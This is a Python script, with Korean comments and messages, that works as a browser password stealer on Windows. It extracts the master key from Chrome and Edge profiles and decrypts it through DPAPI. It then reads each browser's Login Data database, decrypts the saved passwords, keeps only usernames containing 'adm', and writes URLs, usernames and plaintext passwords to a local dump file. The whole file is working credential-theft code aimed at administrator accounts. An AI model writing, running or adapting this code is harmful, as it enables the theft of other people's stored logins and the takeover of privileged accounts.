import os
import json
import sqlite3
import shutil
import base64
from Cryptodome.Cipher import AES
import win32crypt

def get_master_key(browser):
    path = os.path.join(os.environ["LOCALAPPDATA"], browser, "User Data", "Local State")
    with open(path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(buff, master_key):
    try:
        if buff.startswith(b'v10'):
            iv = buff[3:15]
            payload = buff[15:-16]
            tag = buff[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(payload, tag).decode()
        else:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
    except:
        return "(복호화 실패)"

def extract_from_browser(browser_name, browser_path):
    login_db = os.path.join(os.environ["LOCALAPPDATA"], browser_path, "User Data", "Default", "Login Data")
    if not os.path.exists(login_db):
        return []

    tmp_db = f"tmp_{browser_name}_login.db"
    shutil.copyfile(login_db, tmp_db)

    conn = sqlite3.connect(tmp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    master_key = get_master_key(browser_path)
    results = []
    for url, user, enc_pw in cursor.fetchall():
        if user and 'adm' in user.lower():  # adm가 들어간 계정만 필터링
            dec_pw = decrypt_password(enc_pw, master_key)
            results.append((browser_name, url, user, dec_pw))

    conn.close()
    os.remove(tmp_db)
    return results

if __name__ == "__main__":
    all_creds = []

    # Chrome
    all_creds += extract_from_browser("Chrome", "Google\\Chrome")

    # Edge
    all_creds += extract_from_browser("Edge", "Microsoft\\Edge")

    with open("browser_dump.txt", "w", encoding="utf-8") as f:
        for browser, url, user, pw in all_creds:
            f.write(f"[{browser}] {url} - {user} / {pw}\n")

    print(f"[+] 'adm' 포함 계정 {len(all_creds)}개 저장 완료")
